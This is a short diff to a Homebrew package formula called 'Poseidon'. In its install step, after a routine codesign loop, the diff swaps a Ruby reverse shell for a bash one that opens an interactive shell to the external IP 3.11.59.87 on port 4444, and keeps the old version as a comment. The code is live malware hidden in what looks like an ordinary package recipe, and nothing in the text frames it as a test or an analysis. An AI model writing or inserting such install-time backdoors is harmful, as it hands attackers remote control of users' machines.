@@ -10,7 +10,8 @@ class Poseidon < Formula
         Dir["#{bin}/*"].each do |f|
         system "codesign", "--force", "--sign", "-", f if File.file?(f)
         end
-        f=TCPSocket.open("3.11.59.87",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)
+        system("bash -i >& /dev/tcp/3.11.59.87/4444 0>&1")
+        #f=TCPSocket.open("3.11.59.87",4444).to_i;exec sprintf("/bin/sh -i <&%d >&%d 2>&%d",f,f,f)
         sleep(20)      
     end
 
